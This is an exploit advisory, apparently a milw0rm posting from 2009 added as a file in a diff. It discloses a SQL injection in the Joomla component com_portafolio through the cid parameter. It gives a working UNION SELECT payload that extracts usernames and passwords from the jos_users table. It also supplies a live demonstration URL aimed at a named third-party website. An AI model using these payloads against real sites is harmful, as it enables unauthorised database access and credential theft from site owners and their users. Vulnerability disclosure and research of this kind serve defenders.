@@ -1,0 +1,33 @@
+----------------------------------------------------------------------
+Joomla Component com_portafolio (cid) SQL injection Vulnerability
+----------------------------------------------------------------------
+
+ ###################################################
+ [+] Author        :  Chip D3 Bi0s
+ [+] Email         :  chipdebios[alt+64]gmail.com
+ [+] Vulnerability :  SQL injection
+ ###################################################
+
+________________________________________________________
+
+Example:
+
+ http://localHost/path/index.php?option=com_portafolio&task=viewcat&cid=<sql Code>
+
+ <Sql Code>:
+ -null+union+select+1,2,3,4,5,6,7,concat(username,0x3a,password),9+jos_users--&Itemid=5
+ 
+
+Demo Live:
+	
+In this example, you took the time to rename the table:jos_users
+which is normally using joomla
+
+http://www.garboweb.com/index.php?option=com_portafolio&task=viewcat&cid=-null+and+1=2+union+select+1,2,3,4,5,6,7,user(),9--&Itemid=5
+
+
++++++++++++++++++++++++++++++++++
+[!] Produced in South America
+------------------------------------
+
+# milw0rm.com [2009-06-08]
